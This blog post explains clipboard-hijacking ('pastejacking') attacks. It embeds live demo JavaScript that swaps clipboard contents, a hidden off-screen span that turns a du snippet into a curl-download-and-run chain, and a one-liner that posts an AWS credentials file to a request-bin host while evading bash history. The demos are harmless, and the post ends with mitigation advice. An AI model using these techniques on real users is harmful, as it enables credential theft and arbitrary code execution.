---
layout: post
asset: "/assets/posts/dont-trust-your-clipboard"
excerpt: Copy-pasting code seems harmless, but could it be the hacker's next exploit? Don't let habit blind you from the hidden risks of copy-paste in your terminal.
---

At first glance, copying and pasting code from the internet appears innocuous and is a daily practice. It's common to copy code from various online sources everyday without a second thought, however, just as hackers exploit our desensitization to opening emails and clicking on links, we can also become accustomed to the potential risks of copying and pasting code into their terminals.

Before warned, this post highlights the importance of being cautious when copying and pasting text from the internet, and the content below is no exception. While I cannot prevent you from copying the code yourself, I urge you to proceed with caution.

## Arbitrary Code Execution

One of my favorite examples of why you should exercise caution when running copy and paste commands from websites is the git gist authored by `frankbi`.

<div style="text-align: center;">
    <img style="max-width: 75%;" src="{{ page.asset }}/rickrollbashcode.png">
    <br>
    <img style="max-width: 75%;" src="{{ page.asset }}/rickroll.gif"/>
</div>

Although the rickroll itself may seem harmless, the fact that it involves arbitrary code execution on your system is something that should make you uneasy. Many project installation instructions are now utilizing similar commands such as `curl -L https://example.com/script.sh | bash` or `bash -c $(curl -fsSL https://example.com/script.sh)`. A prominent example of this is Homebrew.

#### [Install Homebrew - brew.sh](https://brew.sh/)
<div style="text-align: center;">
    <img style="max-width: 85%;" src="{{ page.asset }}/copy_select_brew.png">
</div>

Let's examine the different methods of copying text that can lead to code execution, including copying via button and the traditional select, copy, and paste method.

## Copy Text Via Button

The copy button purpose is to save you the backbreaking task of highlighting and `ctrl + c` or `right click copy` the text itself. Below of some examples where I have encountered the copy text button:

#### [Amazon EC2 key pairs | aws.amazon.com](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-key-pairs.html)

<div style="text-align: center;">
    <img style="max-width: 100%;" src="{{ page.asset }}/copy_button_docs_aws.png">
</div>

#### [pyenv/pyenv README| github.com](https://github.com/pyenv/pyenv)

<div style="text-align: center;">
    <img style="max-width: 80%;" src="{{ page.asset }}/copy_button_github_readme.png">
</div>


The examples above are not inherently harmful, but they lead individuals to trust the copy button as a means of transferring commands from a website to a terminal. What's overlooked is that you are at the mercy of the website's code. Let's consider a scenario where we visit a blog post written by someone with malicious intent.

<link rel="stylesheet" href="{{ page.asset }}/totallysafeandhelpful.css">

<div id="totallysafeandhelpful">
  <h3>Welcome to totally-safe-and-helpful.blog</h3>
  <p>Today we are going to give you a couple of useful docker commands. You can copy all the commands into your terminal using the handy copy button!</p>
  <table>
    <td style="vertical-align: middle; width: 100%">
      <div class="code nocopy">docker rmi $(docker images -a -q)</div>
    </td>
    <td style="vertical-align: middle;">
      <div class="code1">
        <button class="button" onclick="nefariousCopy()"><span>📋</span></button>
      </div>
      </td>
  </table>
    <br>
</div>

<script>
function nefariousCopy(n) {
  var dummy = document.createElement("textarea");
  document.body.appendChild(dummy);
  dummy.textContent = `curl -L https://nickstanley574.github.io/{{ page.asset }}/ghostbusters \n`;
  dummy.select();
  document.execCommand("copy");
  document.body.removeChild(dummy);
}
</script>
<br>
<div style="text-align: center;">
<video style="max-width: 75%;"  controls>
  <source src="{{ page.asset }}/ghostbusters.webm">
  Your browser does not support HTML video.
</video>
</div>


You just got ghostbusted!

The copy button called a javascript function.
```
<button class="button" onclick="nefariousCopy()"><span>📋</span></button>
```

The nefariousCopy function creates a dummy text element and selects its' contents. Using [`execCommand(copy)`](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Interact_with_the_clipboard) the dummy text is copied to the clipboard and the user is none the wiser.
```
function nefariousCopy(n) {
  var dummy = document.createElement("textarea");
  document.body.appendChild(dummy);
  dummy.textContent = `curl -L https://nickstanley574.github.io{{ page.asset }}/ghostbusters \n`;
  dummy.select();
  document.execCommand("copy");
  document.body.removeChild(dummy);
}
```

This is what is copied to the clipboard when the copy button is clicked:
```
curl -L https://nickstanley574.github.io{{ page.asset }}/ghostbusters \n
```

Using `select()` plus `execCommand()` is the way most copy buttons work, just instead of adding a dummy element, they select and copy the text from elements seen by the user, but the user is at the mercy of the copy function.

## Select, Copy & Paste

Lets go back to Look at another post from  totally-safe-and-helpful.blog.

<div id="totallysafeandhelpful">

  <h3>Welcome back to totally-safe-and-helpful.blog</h3>

  Today we are going to explore how to find the files taking up all your harddisk space using the <b>du</b> command.

  <br><br>
  <div class="code">du -hs *<span style="position: absolute; top: -200px; left: -200px;">; curl -s -L https://nickstanley574.github.io/{{ page.asset }}/sl --output sl; chmod +x sl; ./sl; clear;<br>du -hs * </span> | sort -rh | head -5</div>
  <br>
</div>

Seems safe enough; Looks like any other code snippet on the internet. You can see where this is going. All aboard 🚂 !

<div style="text-align: center;">
<video style="max-width: 90%;"  controls>
  <source src="{{ page.asset }}/choochoo.webm">
  Your browser does not support HTML video.
</video>
</div>

```
<div class="code">
  du -hs *
  <span style="position: absolute; top: -200px; left: -200px;">
  "; curl -s -L https://nickstanley574.github.io//assets/posts/dont-trust-your-clipboard/sl --output sl; chmod +x sl; ./sl; clear;"
  <br>
  du -hs *
  </span>
  | sort -rh | head -5
</div>
```

This time the bad actor used a `<span>` tag inside of a `<div>`. A `<span>` tag is a inline container similar to `<b>` and `<i>`. It is used to apply styles to text. For example: Don't <b>ever</b> push the <b><span style="color:red">red</span> one</b>.

```
<p>Don't <b>ever</b> push the <b><span style="color:red">red</span> one</b>.</p>
```

This allows us to add style to text, but the browser allows the copy without the the format applied. The `<span>` contains the styling of `position: absolute; top: -200px; left: -200px;` which puts the text off screen in the upper left corner of the browser window. Even though you can't see it doesn't mean its not copied. When the `du` command is highlighted so is the text in the `<span>`. Here is what is copied to your clipboard.

```
du -hs *; curl -s -L https://nickstanley574.github.io//assets/posts/dont-trust-your-clipboard/sl --output sl; chmod +x sl; ./sl; clear;
du -hs * | sort -rh | head -5
```

The curl downloads a file, makes it executable, runs it.

## Composing the Attacks

### Attack Avenue 1

The sudo command gives a user temporarily elevated privileges allowing the completion of tasks that require to be run with elevated privilege.  When sudo is run the user is asked to enter their password to allow the action. Sudo then will check if the user has the need permissions to run the command if not the command will get denied. For example lets install `apache` and `nginx`.

```
nick /home $ sudo apt-get install apache2
[sudo] password for nick:
Reading package lists... Done
...
nick /home $ sudo apt-get install nginx
Reading package lists... Done
```

Notice for the second `sudo` command it didn't require a password. The `sudo` command has a `timestamp_timeout` feature that specifies the amount of time that can pass before `sudo` asks for a password again. This allows users to execute multiple privileged commands in a short period without having to repeatedly enter their password. The default value for this feature is 5 minutes.

Hackers can start by initiating a genuine sudo command that prompts the user for their password, and then proceed to execute a hidden malicious command during copy and paste using the subsequent sudo command. This could result in the installation of spyware or ransomware on the system, among other actions.

### Attack Avenue 2

AWS credentials are stored in plaintext and is normally owned by the current user in that user's home folder, by default the path is `~/.aws/credentials`. When the user is the owner, then there's no need to use sudo to access these credentials. As a result, any process executed under the user's account would be able to gain access to these confidential information. 

To demonstrate this we are going to use RequestBin. RequestBin is a web-based tool that allows you to inspect and debug HTTP requests. It provides a unique URL that you can use to send HTTP requests to, and then allows you to inspect the request in real-time. 

For this exercise there is AWS creds for the `james007` is located in `~/.aws/credentials-fake`. And James found the following from totally-safe-and-helpful.blog.

<div id="totallysafeandhelpful">
  <table>
    <td style="vertical-align: middle; width: 100%">
      <div class="code nocopy">top -d 0.25 -c</div>
    </td>
    <td style="vertical-align: middle;">
      <div class="code1">
        <button id=b2 class="button2" onclick="nefariousCopy2()"><span>📋</span></button>
      </div>
      </td>
  </table>
</div>

<script>
var clicks = 0;
function nefariousCopy2(n) {
  var dummy = document.createElement("textarea");
  document.body.appendChild(dummy);
  console.log(clicks)
  if (clicks == 0) {
    document.getElementById("b2").classList.toggle("button2");
    dummy.textContent = ` curl -s -d "$(cat ~/.aws/credentials-fake)" https://envbrzdr9hp9.x.pipedream.net/ > /dev/null; clear; top -d 0.25 -c; clear; \n`;
  } else {
    dummy.textContent = `top -d 0.25 -c \n`;
  }
  clicks++
  dummy.select();
  document.execCommand("copy");
  document.body.removeChild(dummy);
}
</script>

The copy button will copy the following command.

{: .no-code-wrap}
$  curl -s -d "$(cat ~/.aws/credentials-fake)" https://envbrzdr9hp9.x.pipedream.net/ > /dev/null; top -d 0.25 -c; clear;

There are some subtleties to this commands that we should explore. Notice the space between the extra `$` prompt and the command itself. This will prevent the command from being saved to your bash history ([See HISTCONTROL](https://ss64.com/bash/history.html)). This means that the command will send the contents of the aws cred file to the RequestBin/pipedream endpoint, run the expect command, then clear terminal window, and nothing will be saved to the bash history.

<div style="text-align: center;">
<video style="max-width: 85%;"  controls>
  <source src="{{ page.asset }}/steal-aws-creds.webm">
  Your browser does not support HTML video.
</video>
</div>

The ony indication that something is off is the terminal being cleared and the command is still copied to the clipboard. For a use to realize they have been compromised they would have to recognize the terminal clear being unusual before the copy something else to the clipboard. 

## Where do we go from here? 

To not copy from the internet would be crazy, but to mitigate the risk, I do not directly copy and paste text into the terminal. Instead, I paste the text into a plaintext editor, review the command, and then paste or rewrite it into the terminal. It takes a bit longer, but when working on systems that have access to either my personal or client data, the extra time is worth the added security.

In a enterprise environment, another option is to prevent critical systems from having any type of access to the internet. Instead, make sure nothing can reach the internet and have dependencies, package repos, and other external resources be in some type of internal artifacts store. This way even if something malicious is copied there is no way to download from or upload to the internet. 

Sharing code is amazing, but just like everything else be safe, be responsible, and be smart. 